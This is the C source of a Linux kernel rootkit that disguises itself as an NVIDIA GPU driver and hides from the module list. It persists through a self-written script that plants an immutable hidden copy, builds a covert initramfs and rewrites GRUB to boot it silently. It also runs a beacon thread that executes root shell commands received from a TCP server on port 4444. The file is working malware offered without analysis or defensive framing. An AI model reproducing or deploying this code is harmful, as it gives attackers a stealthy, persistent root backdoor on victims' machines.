// hidden_module.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/delay.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/sock.h>
#include <linux/inet.h>
#include <linux/kmod.h>
#include <linux/fs.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/unistd.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("kernel");
MODULE_DESCRIPTION("Mimic NVIDIA GPU Driver");
MODULE_ALIAS("pci:v000010DEd00001D01sv*sd*bc*sc*i*");

static struct task_struct *beacon_thread;
static struct socket *conn_socket = NULL;
#define SERVER_IP   0x7F000001  // 127.0.0.1
#define SERVER_PORT 4444
#define BUF_SIZE 1024

// Check if persistence exists by testing for the hidden initramfs file
static bool is_persisted(void) {
    struct file *file;
    bool exists = false;

    file = filp_open("/boot/.initrd-recovery-backup.gz", O_RDONLY, 0);
    if (!IS_ERR(file)) {
        exists = true;
        filp_close(file, NULL);
    }

    return exists;
}

// Drop and execute a persistence script from kernel space
static void setup_persistence(void) {
    struct file *fp;
    loff_t pos = 0;
    char *script_path = "/tmp/.persist.sh";
    char *script_content =
        "#!/bin/sh\n"
        "mkdir -p /usr/lib/x86_64-linux-gnu/security\n"
        "cp /tmp/hidden_module.ko /usr/lib/x86_64-linux-gnu/security/.libcrypto-helper.ko\n"
        "chattr +i /usr/lib/x86_64-linux-gnu/security/.libcrypto-helper.ko\n"
        "mkdir -p /tmp/custom_initramfs\n"
        "cp /usr/lib/x86_64-linux-gnu/security/.libcrypto-helper.ko /tmp/custom_initramfs/hidden_module.ko\n"
        "echo '#!/bin/sh\nmount -t proc none /proc\ninsmod /hidden_module.ko\nexec /sbin/init' > /tmp/custom_initramfs/init\n"
        "chmod +x /tmp/custom_initramfs/init\n"
        "cd /tmp/custom_initramfs && find . | cpio -H newc -o | gzip > /boot/.initrd-recovery-backup.gz\n"
        "chattr +i /boot/.initrd-recovery-backup.gz\n"
        "echo \"menuentry 'Ubuntu (recovery shell)' { set root='hd0,msdos1'; linux /boot/vmlinuz-$(uname -r) root=/dev/sda1 ro quiet; initrd /boot/.initrd-recovery-backup.gz }\" >> /etc/grub.d/40_custom\n"
        "update-grub\n"
        "grub-set-default 'Ubuntu (recovery shell)'\n"
        "sed -i 's/^GRUB_TIMEOUT=.*/GRUB_TIMEOUT=0/' /etc/default/grub\n"
        "update-grub\n"
        "rm -rf /tmp/custom_initramfs /tmp/.persist.sh\n";

    fp = filp_open(script_path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (!IS_ERR(fp)) {
        kernel_write(fp, script_content, strlen(script_content), &pos);
        filp_close(fp, NULL);

        char *argv[] = { "/bin/sh", script_path, NULL };
        static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }
}

// Kernel-space TCP connection function
static int connect_to_server(void) {
    struct sockaddr_in s_addr;
    int ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
    if (ret < 0) return ret;

    memset(&s_addr, 0, sizeof(s_addr));
    s_addr.sin_family = AF_INET;
    s_addr.sin_addr.s_addr = htonl(SERVER_IP);
    s_addr.sin_port = htons(SERVER_PORT);

    ret = conn_socket->ops->connect(conn_socket, (struct sockaddr *)&s_addr, sizeof(s_addr), 0);
    return ret;
}

// Receive and execute shell commands
static int beacon_main(void *data) {
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    char recv_buf[BUF_SIZE];
    int len;

    if (connect_to_server() < 0) return 0;

    while (!kthread_should_stop()) {
        memset(recv_buf, 0, BUF_SIZE);
        len = kernel_recvmsg(conn_socket, &(struct msghdr){ .msg_flags = 0 },
                             &(struct kvec){ .iov_base = recv_buf, .iov_len = BUF_SIZE },
                             1, BUF_SIZE, 0);

        if (len > 0) {
            recv_buf[len] = '\0';
            printk(KERN_INFO "[beacon] Got command: %s\n", recv_buf);

            // Build argument array for shell
            argv[2] = recv_buf;

            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
        }

        msleep(1000);
    }

    return 0;
}

static int __init hidden_init(void) {
    printk(KERN_INFO "[hidden_module] Hello world!\n");

    // Hide module
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    // Auto-persist if not already
    if (!is_persisted()) {
        setup_persistence();
        printk(KERN_INFO "[hidden_module] Auto-persistence deployed.\n");
    }

    // Start C2 thread
    beacon_thread = kthread_run(beacon_main, NULL, "beacon_thread");
    return 0;
}

static void __exit hidden_exit(void) {
    if (beacon_thread)
        kthread_stop(beacon_thread);

    if (conn_socket)
        sock_release(conn_socket);

    printk(KERN_INFO "[hidden_module] Goodbye!\n");
}

module_init(hidden_init);
module_exit(hidden_exit);
